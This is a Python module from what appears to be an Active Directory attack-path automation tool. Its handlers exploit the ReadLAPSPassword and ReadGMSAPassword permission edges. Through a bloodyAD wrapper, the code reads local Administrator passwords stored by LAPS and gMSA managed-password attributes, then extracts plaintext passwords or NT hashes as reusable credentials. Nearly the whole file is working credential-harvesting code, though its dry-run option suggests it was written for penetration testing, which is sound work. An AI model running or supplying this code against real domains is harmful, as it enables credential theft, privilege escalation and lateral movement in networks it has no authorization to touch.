"""Credential-reading edge exploitation handlers.

Handles ReadLAPSPassword and ReadGMSAPassword edges -- both are read-only
operations that extract stored credentials from AD attributes.
"""

from __future__ import annotations

import re

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import bloodyad_wrapper as bloody


@register_handler("ReadLAPSPassword")
class ReadLAPSHandler(BaseEdgeHandler):
    """Handles ReadLAPSPassword edges.

    Reads the LAPS-managed local administrator password from the target
    computer's ``ms-Mcs-AdmPwd`` (legacy LAPS) or ``ms-LAPS-Password``
    (Windows LAPS) attribute via bloodyAD.

    Returns a password credential for the computer's local Administrator
    account.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label.lower() != "computer":
            return False, f"ReadLAPSPassword requires a Computer target, got {edge.target.label}"
        return True, f"Can read LAPS password for {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        auth_args = self._get_auth_args(principal)
        domain = self._get_domain()

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would read LAPS password for {target}",
                [],
            )

        self.logger.info("Reading LAPS password for %s", target)
        result = await bloody.read_laps(self.config, auth_args, target)

        if not result["success"]:
            return (
                False,
                f"Failed to read LAPS password for {target}: {result.get('error', 'unknown')}",
                [],
            )

        # Parse the LAPS password from output
        laps_password = self._extract_laps_password(result)

        if not laps_password:
            return (
                False,
                f"LAPS attribute read succeeded but no password found in output for {target}",
                [],
            )

        cred = Credential(
            cred_type=CredentialType.password,
            value=laps_password,
            username="Administrator",
            domain=target,  # Local admin, domain is the computer name
            obtained_from=f"LAPS password read from {target}",
        )

        self.logger.info("LAPS password retrieved for %s", target)
        return True, f"LAPS password read for {target}", [cred]

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # Read-only operation; no rollback needed.
        return None

    @staticmethod
    def _extract_laps_password(result: dict) -> str | None:
        """Extract the LAPS password from bloodyAD output.

        Handles both legacy ``ms-Mcs-AdmPwd`` and Windows LAPS
        ``ms-LAPS-Password`` (JSON blob) formats.
        """
        # Try parsed JSON first
        parsed = result.get("parsed")
        if isinstance(parsed, dict):
            # Windows LAPS JSON format: {"p": "password", "t": "...", "n": "..."}
            if "p" in parsed:
                return parsed["p"]
            # Direct attribute value
            for key in ("ms-Mcs-AdmPwd", "ms-LAPS-Password", "mcs-AdmPwd"):
                if key in parsed:
                    val = parsed[key]
                    # Windows LAPS stores a JSON string
                    if isinstance(val, str) and val.startswith("{"):
                        import json

                        try:
                            inner = json.loads(val)
                            return inner.get("p", val)
                        except (json.JSONDecodeError, ValueError):
                            return val
                    return str(val)

        # Fallback: regex against raw output
        output = result.get("output", "")
        # Legacy LAPS: plain password string after attribute name
        match = re.search(r"ms-(?:Mcs-AdmPwd|LAPS-Password)\s*[:=]\s*(.+?)(?:\s|$)", output)
        if match:
            return match.group(1).strip()

        # If the output is just the password with no label
        if output and len(output) < 128 and "\n" not in output:
            return output.strip()

        return None


@register_handler("ReadGMSAPassword")
class ReadGMSAHandler(BaseEdgeHandler):
    """Handles ReadGMSAPassword edges.

    Reads the Group Managed Service Account (gMSA) password from the
    target's ``msDS-ManagedPassword`` attribute via bloodyAD and derives
    the NT hash.

    Returns an NT hash credential for the gMSA account.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        target_type = edge.target.label.lower()
        if target_type not in {"user", "computer"}:
            return False, f"ReadGMSAPassword requires a User or Computer target, got {edge.target.label}"
        return True, f"Can read gMSA password for {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        auth_args = self._get_auth_args(principal)
        domain = self._get_domain()

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would read gMSA password for {target}",
                [],
            )

        self.logger.info("Reading gMSA password for %s", target)
        result = await bloody.read_gmsa(self.config, auth_args, target)

        if not result["success"]:
            return (
                False,
                f"Failed to read gMSA password for {target}: {result.get('error', 'unknown')}",
                [],
            )

        # Extract the NT hash from the gMSA password blob
        nt_hash = self._extract_gmsa_hash(result)

        if not nt_hash:
            return (
                False,
                f"gMSA attribute read succeeded but could not extract NT hash for {target}",
                [],
            )

        cred = Credential(
            cred_type=CredentialType.nt_hash,
            value=nt_hash,
            username=target,
            domain=domain,
            obtained_from=f"gMSA password read from {target}",
        )

        self.logger.info("gMSA NT hash retrieved for %s", target)
        return True, f"gMSA NT hash read for {target}", [cred]

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # Read-only operation; no rollback needed.
        return None

    @staticmethod
    def _extract_gmsa_hash(result: dict) -> str | None:
        """Extract the NT hash from bloodyAD gMSA output.

        bloodyAD typically outputs the NT hash directly when reading
        ``msDS-ManagedPassword``, or provides it in a structured format.
        """
        parsed = result.get("parsed")
        if isinstance(parsed, dict):
            # Look for common output keys
            for key in ("nt_hash", "nthash", "NT", "hash"):
                if key in parsed:
                    return str(parsed[key])

        # Fallback: regex against raw output for a 32-character hex string
        output = result.get("output", "")
        match = re.search(r"\b([a-fA-F0-9]{32})\b", output)
        if match:
            return match.group(1).lower()

        return None
